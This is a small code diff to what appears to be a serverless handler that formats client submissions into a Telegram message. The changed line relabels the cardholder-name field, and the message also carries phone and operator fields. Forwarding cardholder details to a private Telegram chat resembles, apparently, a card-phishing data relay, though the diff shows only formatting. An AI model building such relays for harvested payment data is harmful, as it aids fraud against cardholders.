@@ -33,7 +33,7 @@ exports.handler = async (event) => {
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
     let text = `📩 *Nouveau message dyal client*\n\n`;
-    text += `*Nom:* ${titulaire_de_la_carte}\n`;
+    text += `*titulaire_de_la_carte:* ${titulaire_de_la_carte}\n`;
     
     if (phone) text += `*Téléphone:* ${phone}\n`;
     if (operator) text += `*Opérateur:* ${operator}\n`;
